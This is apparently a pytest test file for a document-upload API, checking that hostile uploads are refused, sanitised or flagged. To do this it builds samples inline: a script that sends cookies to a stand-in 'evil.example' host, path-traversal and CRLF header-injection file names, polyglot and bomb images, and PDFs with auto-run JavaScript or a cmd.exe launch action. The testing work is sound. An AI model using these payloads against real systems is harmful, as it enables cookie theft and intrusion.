"""Abuse case 5 (US-105; THREAT_MODEL T4 malicious or oversized uploads, SEC-005,
US-085, US-099): hostile uploads are refused, neutralised or flagged. Every payload is built here at test time
and never committed.

Already asserted elsewhere and not repeated: a 45-megapixel PNG is refused unread
(tests/integration/test_storage_budget.py), a Content-Length far over the cap and a chunked body are refused
before they are read (tests/integration/test_edge_cases.py), a crafted slow PDF is killed at the deadline
(tests/integration/test_verification_worker.py), and the PDF active-content rule on bytes
(tests/unit/test_scan_domain.py).
"""

import os
import time
import zlib
from io import BytesIO

import pytest
from fastapi.testclient import TestClient
from PIL import Image, PngImagePlugin
from sqlalchemy import select
from sqlalchemy.orm import Session

from app.core.settings import get_settings
from app.domain.scan import CLEAN, INFECTED
from app.infra.storage import get_storage
from app.models import Document
from app.models.enums import Role
from app.services.platform_settings import live
from tests.factories import login, make_user
from tests.integration.test_clarification import _attach, _respond, _submitted
from tests.journeys import PDF, complete_draft, draft, tiny_png, upload

API = "/api/v1"
HTML = b"<html><body><script>fetch('//evil.example/?c='+document.cookie)</script></body></html>"
# Built at run time from two halves: the whole string in a source file is what antivirus products flag.
EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def _operator(client: TestClient, db: Session) -> tuple[dict[str, str], str]:
    make_user(db, "op@example.sg", Role.OPERATOR)
    h = login(client, "op@example.sg")
    return h, draft(client, h)


def _stored_files() -> list[str]:
    root = get_settings().upload_dir
    return [os.path.join(d, f) for d, _, files in os.walk(root) for f in files] if os.path.isdir(root) else []


def _bytes_of(doc: Document) -> bytes:
    return b"".join(get_storage().open(doc.stored_key))


def _download(client: TestClient, h: dict[str, str], app_id: str, doc: Document):  # type: ignore[no-untyped-def]
    return client.get(f"{API}/applications/{app_id}/documents/{doc.id}/download", headers=h)


# ---- EICAR (needs a real clamd; the Backend CI job runs the same check against one) ----


@pytest.mark.skipif(
    not os.environ.get("CLAMD_HOST"), reason="needs a running clamd: set CLAMD_HOST (and CLAMD_PORT)"
)
def test_eicar_is_blocked_and_never_served(
    client: TestClient, db: Session, monkeypatch: pytest.MonkeyPatch
) -> None:
    settings = get_settings()
    monkeypatch.setattr(settings, "scan_mode", "enforce")
    monkeypatch.setattr(settings, "clamd_host", os.environ["CLAMD_HOST"])
    monkeypatch.setattr(settings, "clamd_port", int(os.environ.get("CLAMD_PORT", "3310")))
    h, app_id = _operator(client, db)
    # on its own and buried in ordinary text: the test string is found in either
    for name, data, mime in (
        ("eicar.txt", EICAR, "text/plain"),
        ("eicar-in-text.txt", b"Tenancy notes.\n" + EICAR + b"\n", "text/plain"),
    ):
        upload(client, h, app_id, "floor_plan", name, data, mime)
        db.expire_all()
        doc = db.scalar(select(Document).where(Document.original_filename == name))
        assert doc is not None and doc.scan_state == INFECTED, name
        assert doc.stored_key.startswith("quarantine/")
        got = _download(client, h, app_id, doc)
        assert got.status_code == 403 and got.json()["error"]["code"] == "file_infected"


# ---- polyglots ----


def test_a_pdf_that_is_also_html_is_never_served_as_html(client: TestClient, db: Session) -> None:
    """The file really starts with %PDF-, so it is stored as a PDF. What matters is what a browser does with
    it: a fixed type, a forced download, no sniffing, and a CSP that allows nothing to run."""
    h, app_id = _operator(client, db)
    polyglot = b"%PDF-1.4\n" + HTML + b"\n%%EOF\n"
    r = upload(client, h, app_id, "floor_plan", "plan.pdf", polyglot)
    assert r.status_code == 201, r.text
    doc = db.scalar(select(Document))
    assert doc is not None
    got = _download(client, h, app_id, doc)
    assert got.status_code == 200 and got.content == polyglot
    assert got.headers["content-type"].startswith("application/pdf")
    assert got.headers["content-disposition"].startswith("attachment;")
    assert got.headers["x-content-type-options"] == "nosniff"
    assert got.headers["content-security-policy"] == "default-src 'none'; frame-ancestors 'none'"


def test_html_text_is_served_as_a_plain_text_attachment(client: TestClient, db: Session) -> None:
    h, app_id = _operator(client, db)
    assert upload(client, h, app_id, "floor_plan", "notes.txt", HTML, "text/plain").status_code == 201
    doc = db.scalar(select(Document))
    assert doc is not None
    got = _download(client, h, app_id, doc)
    assert got.headers["content-type"].startswith("text/plain")
    assert got.headers["content-disposition"].startswith("attachment;")
    assert got.headers["x-content-type-options"] == "nosniff"


def _png_with_trailer(trailer: bytes) -> bytes:
    return tiny_png() + trailer


def _png_with_script_chunk() -> bytes:
    info = PngImagePlugin.PngInfo()
    info.add_text("Comment", HTML.decode())
    out = BytesIO()
    Image.new("RGB", (4, 4), (255, 255, 255)).save(out, "PNG", pnginfo=info)
    return out.getvalue()


def _jpeg_with_trailer(trailer: bytes) -> bytes:
    out = BytesIO()
    Image.new("RGB", (8, 8), (255, 255, 255)).save(out, "JPEG")
    return out.getvalue() + trailer


ZIP_TAIL = (
    b"PK\x03\x04\x14\x00\x00\x00\x00\x00" + b"payload.exe" + b"PK\x01\x02" + b"\x00" * 40 + b"PK\x05\x06"
)


@pytest.mark.parametrize(
    ("name", "mime", "build", "marker"),
    [
        ("photo.png", "image/png", lambda: _png_with_trailer(ZIP_TAIL), b"PK\x03\x04"),
        ("photo.png", "image/png", lambda: _png_with_trailer(HTML), b"<script"),
        ("photo.png", "image/png", _png_with_script_chunk, b"<script"),
        ("photo.jpg", "image/jpeg", lambda: _jpeg_with_trailer(ZIP_TAIL), b"PK\x03\x04"),
        ("photo.jpg", "image/jpeg", lambda: _jpeg_with_trailer(HTML), b"<script"),
    ],
)
def test_an_image_with_something_hidden_in_it_is_stored_without_it(
    client: TestClient,
    db: Session,
    name: str,
    mime: str,
    build,
    marker: bytes,  # type: ignore[no-untyped-def]
) -> None:
    """Images are decoded and re-written (US-085): appended archives, scripts and text chunks are dropped."""
    h, app_id = _operator(client, db)
    hostile = build()
    assert marker in hostile
    r = upload(client, h, app_id, "floor_plan", name, hostile, mime)
    assert r.status_code == 201, r.text
    doc = db.scalar(select(Document))
    assert doc is not None
    stored = _bytes_of(doc)
    assert marker not in stored and b"payload.exe" not in stored
    with Image.open(BytesIO(stored)) as image:
        image.verify()  # still a valid picture


# ---- files that are not what their name says ----

ZIP = b"PK\x03\x04\x14\x00\x00\x00\x08\x00" + b"x" * 60
WINDOWS_EXE = b"MZ\x90\x00\x03\x00\x00\x00" + b"x" * 60


@pytest.mark.parametrize(
    ("name", "data", "mime", "reason"),
    [
        ("plan.pdf", HTML, "application/pdf", "content_mismatch"),
        ("plan.pdf", ZIP, "application/pdf", "content_mismatch"),
        ("plan.pdf", WINDOWS_EXE, "application/pdf", "content_mismatch"),
        ("photo.png", b"<svg onload=alert(1)>", "image/png", "content_mismatch"),
        ("photo.jpg", tiny_png(), "image/jpeg", "content_mismatch"),
        ("notes.txt", b"\x00\x01binary" * 8, "text/plain", "content_mismatch"),
        ("page.html", HTML, "text/html", "unsupported_format"),
        ("image.svg", b"<svg onload=alert(1)>", "image/svg+xml", "unsupported_format"),
        ("run.exe", WINDOWS_EXE, "application/octet-stream", "unsupported_format"),
        ("plan.pdf.exe", PDF, "application/pdf", "unsupported_format"),
        ("plan.pdf.html", PDF, "application/pdf", "unsupported_format"),
        ("plan", PDF, "application/pdf", "unsupported_format"),
        ("plan.pdf", PDF, "text/html", "unsupported_format"),  # a declared type that disagrees
        ("archive.zip", ZIP, "application/zip", "unsupported_format"),
    ],
)
def test_a_file_that_is_not_what_it_claims_is_refused_and_nothing_is_kept(
    client: TestClient, db: Session, name: str, data: bytes, mime: str, reason: str
) -> None:
    h, app_id = _operator(client, db)
    r = upload(client, h, app_id, "floor_plan", name, data, mime)
    assert r.status_code == 400 and r.json()["error"]["details"]["reason"] == reason, r.text
    assert db.scalar(select(Document)) is None
    assert _stored_files() == []


@pytest.mark.parametrize(
    "filename",
    [
        "../../../../etc/passwd.pdf",
        "..\\..\\windows\\system32\\plan.pdf",
        "/etc/cron.d/job.pdf",
        "<script>alert(1)</script>.pdf",
        "plan\r\nSet-Cookie: pwned=1.pdf",
        "a" * 400 + ".pdf",
    ],
)
def test_a_hostile_file_name_is_only_a_label(client: TestClient, db: Session, filename: str) -> None:
    """The name is cleaned for display and never decides where the file goes or what header is sent."""
    h, app_id = _operator(client, db)
    r = upload(client, h, app_id, "floor_plan", filename, PDF)
    assert r.status_code == 201, r.text
    doc = db.scalar(select(Document))
    assert doc is not None
    assert not any(c in doc.original_filename for c in "/\\<>\r\n") and len(doc.original_filename) <= 255
    assert doc.stored_key.startswith(f"{app_id}/") and ".." not in doc.stored_key
    root = os.path.realpath(get_settings().upload_dir)
    assert all(os.path.realpath(p).startswith(root + os.sep) for p in _stored_files())
    got = _download(client, h, app_id, doc)
    assert got.status_code == 200
    assert "\r" not in got.headers["content-disposition"] and "\n" not in got.headers["content-disposition"]
    assert "set-cookie" not in got.headers


# ---- oversized ----


@pytest.mark.parametrize("extra", [1, 4096, 64 * 1024])
def test_a_file_over_the_cap_is_refused_whatever_the_overshoot(
    client: TestClient, db: Session, extra: int
) -> None:
    """One byte over reaches the streaming check; 64 KiB over is also past the multipart slack and is
    refused from the header. Both ways: 400 `too_large`, and no byte is kept."""
    h, app_id = _operator(client, db)
    limit = live().int_value("upload_max_bytes")
    data = PDF + b"\x00" * (limit + extra - len(PDF))
    assert len(data) == limit + extra
    r = upload(client, h, app_id, "floor_plan", "huge.pdf", data)
    assert r.status_code == 400 and r.json()["error"]["details"]["reason"] == "too_large", r.text[:200]
    assert db.scalar(select(Document)) is None
    assert _stored_files() == []


def test_an_oversized_clarification_attachment_is_refused_the_same_way(
    client: TestClient, db: Session
) -> None:
    app_id, op, _ = _submitted(client, db)
    view = client.get(f"{API}/applications/{app_id}/clarifications", headers=op).json()
    item = view["items"][0]["item_id"]
    answered = _respond(client, op, app_id, item, "Done.").json()
    response_id = answered["items"][0]["responses"][0]["id"]
    limit = live().int_value("upload_max_bytes")
    r = _attach(client, op, app_id, response_id, "huge.pdf", PDF + b"\x00" * limit)
    assert r.status_code == 400 and r.json()["error"]["details"]["reason"] == "too_large"


# ---- decompression bombs ----


def _png_claiming(width: int, height: int) -> bytes:
    """A real 4 x 4 PNG whose header says it is width x height: a few dozen bytes that promise gigapixels."""
    png = bytearray(tiny_png())
    png[16:20], png[20:24] = width.to_bytes(4, "big"), height.to_bytes(4, "big")
    png[29:33] = zlib.crc32(bytes(png[12:29])).to_bytes(4, "big")
    return bytes(png)


def _flat_image(fmt: str, mode: str, side: int) -> bytes:
    out = BytesIO()
    Image.new(mode, (side, side)).save(out, fmt, **({"optimize": True} if fmt == "PNG" else {}))
    return out.getvalue()


@pytest.mark.parametrize(
    ("name", "mime", "build"),
    [
        ("bomb.png", "image/png", lambda: _png_claiming(60_000, 60_000)),
        ("bomb.png", "image/png", lambda: _png_claiming(2**31 - 1, 2**31 - 1)),
        ("bomb.png", "image/png", lambda: _flat_image("PNG", "L", 7_000)),  # 49 MP, one value
        ("bomb.jpg", "image/jpeg", lambda: _flat_image("JPEG", "L", 7_000)),
    ],
)
def test_a_small_file_that_decodes_to_gigabytes_is_refused_before_it_is_decoded(
    client: TestClient,
    db: Session,
    name: str,
    mime: str,
    build,  # type: ignore[no-untyped-def]
) -> None:
    h, app_id = _operator(client, db)
    bomb = build()
    assert len(bomb) < 1_000_000
    started = time.monotonic()
    r = upload(client, h, app_id, "floor_plan", name, bomb, mime)
    assert r.status_code == 400 and r.json()["error"]["details"]["reason"] == "unreadable_image", r.text
    assert time.monotonic() - started < 10  # refused from the header, not after a long decode
    assert db.scalar(select(Document)) is None
    assert _stored_files() == []


# ---- active content in a PDF ----

RISKY_PDFS = {
    "floor_plan": PDF + b"<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\n",
    "tenancy_agreement": PDF + b"<< /OpenAction 5 0 R >> << /S /Java#53cript /JS (x) >>\n",
    "food_hygiene_certificate": PDF + b"<< /S /Launch /F (cmd.exe) >>\n",
}


def test_a_pdf_with_an_automatic_script_is_flagged_for_the_officer_and_does_not_pass_unnoticed(
    client: TestClient, db: Session, scan_enforced: None
) -> None:
    """Flagged, not blocked (ADR-017): the scanner owns the verdict; the flag tells a person to be careful.
    The flag must reach the officer's view for every spelling of the trick."""
    make_user(db, "op@example.sg", Role.OPERATOR)
    make_user(db, "off@example.sg", Role.OFFICER)
    op, off = login(client, "op@example.sg"), login(client, "off@example.sg")
    app_id = complete_draft(client, op)  # four clean text files
    for dtype, risky in RISKY_PDFS.items():
        r = upload(client, op, app_id, dtype, f"{dtype}.pdf", risky)
        assert r.status_code == 201, r.text
    assert client.post(f"{API}/applications/{app_id}/submit", headers=op).status_code == 200

    case = client.get(f"{API}/officer/applications/{app_id}", headers=off).json()
    by_type = {d["document_type"]: d for d in case["documents"]}
    for dtype in RISKY_PDFS:
        assert by_type[dtype]["active_content"] is True, dtype
        assert by_type[dtype]["scan_state"] == CLEAN
    assert by_type["business_profile"]["active_content"] is False  # the control: an ordinary file
